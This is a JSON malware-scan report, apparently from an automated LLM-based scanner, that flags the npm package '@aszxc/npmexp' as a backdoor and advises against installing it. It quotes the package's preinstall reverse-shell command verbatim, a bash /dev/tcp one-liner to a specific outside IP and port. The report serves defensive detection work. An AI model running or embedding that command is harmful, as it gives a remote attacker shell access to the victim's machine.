@@ -1,0 +1,58 @@
+{
+  "package_name": "@aszxc/npmexp",
+  "version": "1.0.1",
+  "scan_timestamp": "2025-12-25T12:50:44.940967",
+  "final_verdict": {
+    "classification": "MALICIOUS",
+    "confidence": 0.864,
+    "risk_level": "CRITICAL"
+  },
+  "executive_summary": "Backdoor installation via preinstall script The detected behaviors have no legitimate justification based on the package's stated purpose.",
+  "threat_profile": {
+    "attack_type": "Backdoor Installation",
+    "primary_tactics": [
+      "Backdoor Installation"
+    ],
+    "severity_factors": [
+      "Backdoor installation via preinstall script"
+    ]
+  },
+  "evidence_summary": {
+    "malicious_indicators": [
+      {
+        "type": "Backdoor Installation",
+        "description": "A preinstall script is used to establish a reverse shell connection to a remote server.",
+        "severity": "CRITICAL",
+        "command": "bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"
+      }
+    ],
+    "behavioral_chain": "The detected behaviors form a coherent attack chain: Backdoor installation via preinstall script -> Network Call -> Reverse Shell Connection",
+    "legitimacy_assessment": "The behavior of establishing a reverse shell connection to a remote server is not expected for a package named '@aszxc/npmexp'"
+  },
+  "recommendations": {
+    "immediate_action": "DO NOT INSTALL - Remove immediately if already installed",
+    "remediation_steps": [
+      "Review package source code and dependencies",
+      "Report to npm security team if confirmed malicious"
+    ]
+  },
+  "detailed_analysis": {
+    "semantic_detection": {
+      "behaviors_found": 1,
+      "categories": [
+        "backdoor_installation"
+      ],
+      "highest_confidence": 0.9
+    },
+    "verification_analysis": {
+      "chain_coherence": "The detected behaviors form a coherent attack chain: Backdoor installation via preinstall script -> Network Call -> Reverse Shell Connection",
+      "legitimacy_mismatch": true,
+      "calibrated_confidence": 0.84
+    }
+  },
+  "metadata": {
+    "analysis_version": "v2.0",
+    "model": "deepseek-coder-6.7b",
+    "ground_truth_label": "malicious"
+  }
+}
